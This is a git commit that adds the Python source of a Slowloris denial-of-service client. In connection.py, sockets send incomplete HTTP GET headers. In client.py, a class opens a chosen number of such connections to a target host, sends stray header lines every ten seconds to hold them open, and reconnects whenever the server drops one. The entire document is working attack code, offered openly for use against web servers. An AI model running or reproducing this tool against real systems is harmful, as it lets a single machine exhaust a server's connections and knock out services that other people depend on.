d4798bc194239c27782c5d1c0151bfaeb059dfdc
Splitty <splittydev@gmail.com>
2017-03-13 03:18:52 +0100

    Refactor code
    - Make code work with Python 2 and 3
    - Fix code according to pylint

---
+++ src/slow_loris/client.py
@@ -0,0 +1,51 @@
+"""This module implements the SlowLoris client."""
+
+import threading
+import time
+
+from .connection import LorisConnection
+
+# Constants
+DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"
+
+class SlowLoris:
+    """SlowLoris attack client."""
+
+    def __init__(self):
+        self.connections = []
+        self.connection_count = 0
+        self.keepalive_thread = threading.Thread(target=self.keep_alive)
+        self.keepalive_thread.setDaemon(True)
+        self.keepalive_thread.start()
+
+    def attack(self, host, port, count):
+        """Starts the attack."""
+        self.connection_count = count
+        print("Initializing {} connections.".format(count))
+        # Start 'count' connections and send the initial HTTP headers.
+        for _ in range(count):
+            conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+            self.connections.insert(0, conn)
+
+    def stop(self):
+        """Stops the attack."""
+        for conn in self.connections:
+            conn.close()
+
+    def keep_alive(self):
+        """Make sure that connections stay alive once established."""
+        while True:
+            time.sleep(10)
+            print("Sending keep-alive headers for {} connections.".format(self.connection_count))
+            # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
+            for i in range(0, self.connection_count):
+                try:
+                    self.connections[i].keep_alive()
+                # If the server closed one of our connections, re-open the connection in it's place.
+                except KeyboardInterrupt:
+                    raise
+                # pylint: disable=W0702
+                except:
+                    host, port = (self.connections[i].host, self.connections[i].port)
+                    conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+                    self.connections[i] = conn
---
+++ src/slow_loris/connection.py
@@ -0,0 +1,28 @@
+"""This module implements the SlowLoris connection."""
+
+import random
+import socket
+
+class LorisConnection:
+    """SlowLoris connection."""
+
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.connect((self.host, self.port))
+        # TODO: Add SSL support
+
+    def close(self):
+        """Closes the connection."""
+        self.socket.close()
+
+    def send_headers(self, uagent):
+        """Sends headers."""
+        template = "GET /?{} HTTP/1.1\r\n{}\r\nAccept-language: en-US,en,q=0.5\r\n"
+        self.socket.send(template.format(random.randrange(0, 2000), uagent).encode("ascii"))
+        return self
+
+    def keep_alive(self):
+        """Sends keep-alive headers."""
+        self.socket.send("X-a: {}\r\n".format(random.randrange(1, 5000)).encode("ascii"))
